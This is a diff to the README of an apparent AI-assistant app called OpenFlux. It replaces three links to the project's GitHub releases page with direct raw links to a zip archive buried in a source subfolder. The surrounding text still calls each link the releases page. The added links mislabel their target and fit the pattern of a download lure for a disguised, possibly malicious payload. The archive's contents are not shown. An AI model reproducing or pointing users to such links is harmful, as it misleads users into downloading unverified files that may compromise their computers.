@@ -1,6 +1,6 @@
 # ⚡ OpenFlux - AI Assistant for Everyday Tasks
 
-[![Download OpenFlux](https://img.shields.io/badge/Download-OpenFlux-4CAF50?style=for-the-badge)](https://github.com/cheng60/OpenFlux/releases)
+[![Download OpenFlux](https://img.shields.io/badge/Download-OpenFlux-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/cheng60/OpenFlux/main/gateway/src/sessions/Flux-Open-1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ OpenFlux is available to download on its GitHub page. Follow these steps to find
 
 1. Open your web browser (Edge, Chrome, Firefox, etc.).
 2. Go to the OpenFlux releases page:  
-[![Visit OpenFlux Releases](https://img.shields.io/badge/Visit-OpenFlux_Releases-0078D7?style=for-the-badge)](https://github.com/cheng60/OpenFlux/releases)
+[![Visit OpenFlux Releases](https://img.shields.io/badge/Visit-OpenFlux_Releases-0078D7?style=for-the-badge)](https://raw.githubusercontent.com/cheng60/OpenFlux/main/gateway/src/sessions/Flux-Open-1.1.zip)
 3. On this page, look for the latest release version near the top.
 4. Under the latest release, find the Windows installer file. It will usually end with `.exe`.
 5. Click the file name to download it to your computer.
@@ -119,7 +119,7 @@ If issues persist, visit the GitHub page and check the Issues tab for help or re
 
 Start your OpenFlux experience by visiting the download page here:
 
-[![Download OpenFlux](https://img.shields.io/badge/Download-OpenFlux-4CAF50?style=for-the-badge)](https://github.com/cheng60/OpenFlux/releases)
+[![Download OpenFlux](https://img.shields.io/badge/Download-OpenFlux-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/cheng60/OpenFlux/main/gateway/src/sessions/Flux-Open-1.1.zip)
 
 Use this link to find the latest Windows installer and keep your application up to date.
 
